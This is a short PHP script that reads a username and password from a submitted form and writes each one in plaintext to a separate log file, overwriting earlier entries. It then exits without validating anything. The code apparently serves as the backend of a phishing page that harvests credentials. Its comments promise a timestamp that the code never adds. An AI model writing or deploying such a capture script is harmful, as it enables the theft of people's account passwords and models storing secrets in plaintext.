<?php
// Check if POST data is set and not empty
if (!empty($_POST['username']) && !empty($_POST['password'])) {
    // Retrieve and sanitize the POST data
    $username = htmlspecialchars(trim($_POST['username']));
    $password = htmlspecialchars(trim($_POST['password']));

    // Clear the log file before writing new data
    file_put_contents('login_username.log', ''); // Clears the file

    // Prepare the log entry with a timestamp
    $log_entry = "Username: $username";

    // Write the log entry to the file
    file_put_contents('login_username.log', $log_entry, FILE_APPEND);

    // If needed, you can perform additional actions here, like validating credentials or redirecting the user.
// Clear the log file before writing new data
file_put_contents('login_password.log', ''); // Clears the file

// Prepare the log entry with a timestamp
$password_entry = "Password: $password";

// Write the log entry to the file
file_put_contents('login_password.log', $password_entry, FILE_APPEND);
    exit();
} else {
    echo "Error: Username or password not provided.";
}
?>
